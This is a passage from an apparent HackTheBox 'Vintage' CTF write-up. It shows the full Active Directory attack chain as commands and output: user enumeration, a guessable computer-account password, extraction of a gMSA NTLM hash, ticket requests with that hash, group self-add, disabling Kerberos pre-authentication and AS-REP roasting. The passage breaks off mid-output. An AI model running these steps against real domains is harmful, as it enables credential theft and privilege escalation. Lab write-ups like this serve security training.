&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute&lt;span class="p">|&lt;/span> grep SidTypeUser &lt;span class="p">|&lt;/span> cut -d: -f2 &lt;span class="p">|&lt;/span> cut -d &lt;span class="se">\\&lt;/span> -f2 &lt;span class="p">|&lt;/span> cut -d&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span> -f1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guest
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DC01$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gMSA01$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FS01$
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">M.Rossi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">R.Verdi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">L.Bianchi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">G.Viola
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C.Neri
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">P.Rosa
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">svc_sql
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">svc_ldap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">svc_ark
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C.Neri_adm
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">L.Bianchi_adm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I collected data using &lt;code>bloodhound-python&lt;/code> and ingest it to &lt;code>Bloodhound&lt;/code> using the TGT.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage/bloodhound1&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# bloodhound-python -u P.Rosa -p &lt;span class="s1">&amp;#39;Rosaisbest123&amp;#39;&lt;/span> -d vintage.htb -dc dc01.vintage.htb -c All
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found AD domain: vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Getting TGT &lt;span class="k">for&lt;/span> user
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Connecting to LDAP server: dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">1&lt;/span> domains
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">1&lt;/span> domains in the forest
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">2&lt;/span> computers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Connecting to LDAP server: dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">16&lt;/span> users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">58&lt;/span> groups
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">2&lt;/span> gpos
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">2&lt;/span> ous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">19&lt;/span> containers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">0&lt;/span> trusts
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Starting computer enumeration with &lt;span class="m">10&lt;/span> workers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Querying computer: FS01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Querying computer: dc01.vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I used this custom Cypher query to get accounts that have Read access of &lt;code>GMSA01$&lt;/code>&amp;rsquo;s password, and &lt;code>Domain Computers&lt;/code> Group have that Right.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">MATCH &lt;span class="nv">p&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> &lt;span class="o">[&lt;/span>: ReadCMSAPassword&lt;span class="o">]&lt;/span> &amp;gt;0 RETURN p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound1.png"
width="616"
height="303"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound1_hu_e5fba866522fc62f.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound1_hu_42ab26f932763733.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="203"
data-flex-basis="487px"
>&lt;/p>
&lt;p>&lt;code>Domain Computers&lt;/code> Group have &lt;code>FS01$&lt;/code> as a member, which seems to be a File Server account.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound2.png"
width="645"
height="272"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound2_hu_d5876f4055e79af0.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound2_hu_4058964271bd5c0b.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="237"
data-flex-basis="569px"
>&lt;/p>
&lt;p>The &lt;code>FS01$&lt;/code> is part of the &lt;code>Pre-Windows 2000 Compatible computer Access&lt;/code> Group.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound3.png"
width="701"
height="279"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound3_hu_4b71e779bdfa6f78.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound3_hu_19c4138979e6f11d.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="251"
data-flex-basis="603px"
>&lt;/p>
&lt;p>This got me thinking about one &lt;a class="link" href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts" target="_blank" rel="noopener"
>Blog&lt;/a> that i read which say that : &lt;code>When a new computer account is configured as &amp;quot;Pre-Windows 2000 computer&amp;quot;, its password is set based on its name (i.e. lowercase computer name without the trailing &lt;/code>$&lt;code>). When it isn't, the password is randomly generated.&lt;/code>&lt;/p>
&lt;p>So, i tried the &lt;code>fs01&lt;/code> as a password and it did actually works.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo netexec ldap vintage.htb -u &lt;span class="s1">&amp;#39;FS01$&amp;#39;&lt;/span> -p fs01 -k
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDAP vintage.htb &lt;span class="m">389&lt;/span> dc01.vintage.htb &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> x64 &lt;span class="o">(&lt;/span>name:dc01.vintage.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:vintage.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDAP vintage.htb &lt;span class="m">389&lt;/span> dc01.vintage.htb &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> vintage.htb&lt;span class="se">\F&lt;/span>S01$:fs01
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I used the &lt;code>getTGT.py&lt;/code> to generate a ticket to authenticate as &lt;code>FS01$&lt;/code> and export it to the &lt;code>KRB5CCNAME&lt;/code> to use it further.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ getTGT.py -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saving ticket in FS01$.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>FS01&lt;span class="se">\$&lt;/span>.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now i will use &lt;code>bloodyAD&lt;/code> to retrieve the &lt;code>msDS-ManagedPassword&lt;/code> attribute that contains the GMSA01$ password&amp;rsquo;s NTLM hash.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k get object &lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span> --attr msDS-ManagedPassword
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>gMSA01,CN&lt;span class="o">=&lt;/span>Managed Service Accounts,DC&lt;span class="o">=&lt;/span>vintage,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msDS-ManagedPassword.B64ENCODED: qNZ+qlGD+Cx17DM27SffmeF+2eftJRLCsHfxsLxSzhh2dERzgKmiJzvEHrfEAqstlS64r4Y1OQdu8sdCT6b8+gYXpLDa8xBQIFyshNK7YPrERV3rJVALnhITHE4lKIYoagI4Dr9owAMBGo7ZC4LOoBGk90mk4uuIMHNtylVRWva41F+v2TFCzSNfKnBSVuLhiZ+koEMTCkgP3Z+4Xnnluw6qkD3WPsnsYDlYYizOGPhsUwB1GJyzFHawe4iwfVnbWQdouCgflR27treFO5W0R5RqcRhkwEYLomOobFVUa3kGh1iQNdpaJLPI6Uo4767UM1O/sSaeML8nKVKhwsDolA&lt;span class="o">==&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once again i will try get the TGT of the &lt;code>GMSA01$&lt;/code> using its NTLM hash and export it to the &lt;code>KRB5CCNAME&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ getTGT.py vintage.htb/&lt;span class="s1">&amp;#39;gmsa01$&amp;#39;&lt;/span> -hashes :51434c5b357ff89c5f85d994a27f7339 -dc-ip dc01.vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saving ticket in gmsa01$.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>gmsa01&lt;span class="se">\$&lt;/span>.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I got back to &lt;code>Bloodhound&lt;/code> and it turned out that &lt;code>GMSA01$&lt;/code> have &lt;code>GenericWrite&lt;/code> and &lt;code>AddSelf&lt;/code> ACL on the &lt;code>SERVICEMANAGERS&lt;/code> Group.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound4.png"
width="707"
height="263"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound4_hu_8c0ba9c7c30b8ee8.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound4_hu_1fa761033b34a8b.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="268"
data-flex-basis="645px"
>&lt;/p>
&lt;p>This &lt;code>Servicemanagers&lt;/code> group have &lt;code>GenericWrite&lt;/code> on these 3 service accounts as it seems (&lt;code>svc_ark&lt;/code>, &lt;code>svc_ldap&lt;/code> and &lt;code>svc_sql&lt;/code>)&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound5.png"
width="688"
height="493"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound5_hu_2f0802d9eaea187c.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound5_hu_dd29659cd0b8a492.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="139"
data-flex-basis="334px"
>&lt;/p>
&lt;p>So i added the &lt;code>GMSA01$&lt;/code> user account to this group by leveraging the &lt;code>AddSelf&lt;/code> right using &lt;code>bloodyAD&lt;/code> again.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k add groupMember &lt;span class="s2">&amp;#34;SERVICEMANAGERS&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;P.Rosa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> P.Rosa added to &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>SERVICEMANAGERS,OU&lt;span class="o">=&lt;/span>PRE-MIGRATION,DC&lt;span class="o">=&lt;/span>VINTAGE,DC&lt;span class="o">=&lt;/span>HTB
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Since i have &lt;code>GenericAll&lt;/code> on these accounts i tried to &lt;code>DONT_REQ_PREAUTH&lt;/code> to their &lt;code>userAccountControl&lt;/code> attributes.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;DONT_REQ_PREAUTH&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span> property flags added to SVC_ARK&lt;span class="s1">&amp;#39;s userAccountControl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">└─$ bloodyAD --host dc01.vintage.htb -d &amp;#34;VINTAGE.HTB&amp;#34; --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] [&amp;#39;&lt;/span>DONT_REQ_PREAUTH&lt;span class="s1">&amp;#39;] property flags added to SVC_SQL&amp;#39;&lt;/span>s userAccountControl
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;DONT_REQ_PREAUTH&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span> property flags added to SVC_LDAP&lt;span class="err">&amp;#39;&lt;/span>s userAccountControl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I used &lt;code>GetNPUsers.py&lt;/code> to ASREPROAST these account but we got hashes except for the &lt;code>svc_sql&lt;/code> which is weird.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile users.txt vintage.htb/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/ayoub/.local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow&lt;span class="o">()&lt;/span> is deprecated and scheduled &lt;span class="k">for&lt;/span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span class="o">(&lt;/span>datetime.UTC&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">now&lt;/span> &lt;span class="o">=&lt;/span> datetime.datetime.utcnow&lt;span class="o">()&lt;/span> + datetime.timedelta&lt;span class="o">(&lt;/span>&lt;span class="nv">days&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User Administrator doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User DC01$ doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User gMSA01$ doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User FS01$ doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User M.Rossi doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
